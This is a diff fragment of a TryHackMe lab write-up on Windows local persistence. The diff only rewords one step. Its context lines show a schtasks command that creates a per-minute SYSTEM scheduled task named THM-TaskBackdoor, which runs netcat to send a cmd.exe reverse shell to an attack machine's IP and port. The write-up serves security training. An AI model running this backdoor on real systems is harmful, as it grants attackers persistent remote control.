@@ -6,7 +6,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 This writeup was last updated: 07/06/2023
 
 # Task Scheduler
-1. Started this room's machine
+1. Started this task's machine
 2. `schtasks /create /sc <FREQUENCY TYPE> /mo <FREQUENCY> /tn <TASK NAME> /tr "<NETCAT LOCATION> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER>" /ru <USER ACCOUND>` from the compromised Windows machine to create and run a new scheduled task that'll try creating a reverse shell by attempting to connect to a netcat listener on our attack machine at the specified port in a specified frequency 
 ```PowerShell
 C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.39.232 9999" /ru SYSTEM
